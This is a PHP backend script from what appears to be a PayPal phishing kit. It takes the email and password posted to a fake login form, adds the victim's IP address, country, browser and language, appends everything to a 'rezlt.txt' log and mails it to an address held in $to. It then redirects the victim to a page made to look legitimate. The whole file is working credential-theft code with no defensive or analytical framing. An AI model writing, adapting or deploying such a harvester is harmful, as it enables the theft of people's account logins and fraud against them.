<?php

require_once __DIR__.'/functions.php';

if (isset($_POST['EM']) || isset($_POST['PW']))
{

if (!empty($_POST['EM']) || !empty($_POST['PW']))
{

$_SESSION['EM'] = $_POST['EM'];
$_SESSION['PW'] = $_POST['PW'];

$RezltMessage = 
"
<!DOCTYPE html><html><head><title></title><style type='text/css'>*{font-family: arial;}body{background: #f7f7f7;}table tr td{padding: 5px;}table{width: 600px;}.td1{width: 30%;font-weight: bold;}.td2{width: 70%;}.content{ width: 600px; background: #fff;}.title{ padding: 8px; background: black; color: #fff; font-weight: bold; letter-spacing: 3px;}.row { display: table-row; background: #ffffff;}.row:nth-of-type(odd) { background: #e9e9e9;}@media screen and (max-width: 600px) { table { width: 100%; } .content{ width: 100%; }}</style></head><body><center><br><br><br>
<div class='content'>
	<div class='title'>LOGIN INFO</div>
	<table>
		<tr class='row'>
			<td class='td1'>Email</td>
			<td class='td2'>{$_POST['EM']}</td>
		</tr>
		<tr class='row'>
			<td class='td1'>Password</td>
			<td class='td2'>{$_POST['PW']}</td>
		</tr>
	</table>
	<div class='title'>MACHINE INFO</div>
	<table>
		<tr class='row'>
			<td class='td1'>IP</td>
			<td class='td2'><a href='http://geoiptool.com/?ip={$_SERVER['REMOTE_ADDR']}'>{$_SERVER['REMOTE_ADDR']}</a></td>
		</tr>
		<tr class='row'>
			<td class='td1'>COUNTRY</td>
			<td class='td2'>{$_SESSION['country']}</td>
		</tr>
		<tr class='row'>
			<td class='td1'>BROWSER</td>
			<td class='td2'>{$_SERVER['HTTP_USER_AGENT']}</td>
		</tr>
		<tr class='row'>
			<td class='td1'>BROWSER LANG</td>
			<td class='td2'>{$_SERVER['HTTP_ACCEPT_LANGUAGE']}</td>
		</tr>
		<tr class='row'>
			<td class='td1'>DATE</td>
			<td class='td2'>".date('Y-m-d', time())." ".date('H:i:s', time())."</td>
		</tr>
	</table>
</div>
</center></body></html>
";

$RezltHeader  = "MIME-Version: 1.0" . "\r\n";
$RezltHeader .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$RezltHeader .= 'From: xScamx <miakhalifa@brazzers.com>' . "\r\n";

$RezltSubject = "New Ppl-Login From [ ".$_SESSION['country']." - ".$_SERVER['REMOTE_ADDR']." ]";

$TextContent = "
======== LOGIN ========
Email      : ".$_POST['EM']."
Password   : ".$_POST['PW']."
======== MACHINE ========
IP         : http://geoiptool.com/?ip=".$_SERVER['REMOTE_ADDR']."
COUNTRY    : ".$_SESSION['country']."
BROWSER    : ".$_SERVER['HTTP_USER_AGENT']."
BROW.LANG  : ".$_SERVER['HTTP_ACCEPT_LANGUAGE']."
DATE       : ".date('Y-m-d', time())." ".date('H:i:s', time())."


";

$SaveResult = fopen('../../rezlt.txt', 'a');
fwrite($SaveResult, $TextContent);
fclose($SaveResult);

@mail($to, $RezltSubject, $RezltMessage, $RezltHeader);

	header("Location: ../safe_activity.php?_cmd=".md5(rand(1,999))."&verification_dispatch=".base64_encode(md5(rand(1,100))));

}
}

